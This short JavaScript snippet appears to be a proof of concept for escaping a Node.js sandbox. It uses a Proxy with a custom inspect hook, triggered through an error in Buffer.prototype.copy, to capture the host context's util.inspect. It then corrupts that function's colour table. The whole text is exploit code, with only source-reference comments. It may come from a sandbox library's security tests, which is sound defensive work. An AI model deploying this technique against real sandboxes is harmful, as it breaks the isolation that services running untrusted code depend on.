let proxiedInspect;
const source = new Proxy(() => {}, {
  get: function (target, prop, receiver) {
    if (prop === Symbol.for('nodejs.util.inspect.custom')) {
      // https://github.com/nodejs/node/blob/v20.1.0/lib/internal/util/inspect.js#L805-L811
      return function (depth, options, inspect) {
        proxiedInspect = inspect;
      };
    }
    return Reflect.get(...arguments);
  },
});
try {
  Buffer.prototype.copy.bind(source)({});
  // Here, util.inspect is called:
  // https://github.com/nodejs/node/blob/v20.1.0/lib/buffer.js#L209
  // https://github.com/nodejs/node/blob/v20.1.0/lib/internal/errors.js#L1277
  // https://github.com/nodejs/node/blob/v20.1.0/lib/internal/errors.js#L890-L891
} catch {}
// Break util.inspect.colors of the host context
for (const key in proxiedInspect.colors) {
  proxiedInspect.colors[key] = [{ toString: 1 }];
}
